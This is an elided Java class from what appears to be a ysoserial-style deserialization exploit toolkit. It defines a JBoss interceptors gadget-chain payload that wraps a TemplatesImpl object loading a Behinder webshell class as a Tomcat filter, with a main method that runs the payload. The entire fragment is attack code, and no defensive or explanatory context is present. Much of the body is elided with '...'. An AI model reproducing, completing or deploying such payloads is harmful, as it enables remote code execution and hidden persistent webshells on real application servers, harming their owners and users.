...
public class JBossInterceptors1Behinder implements ObjectPayload<Object> {
    ...
    public Object getObject(final String command) throws Exception {
        ...
        final Object gadget = Gadgets.createTemplatesImpl(null, TomcatFilterBehinder.class);
    ...
    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(JBossInterceptors1Behinder.class, args);
    }
}
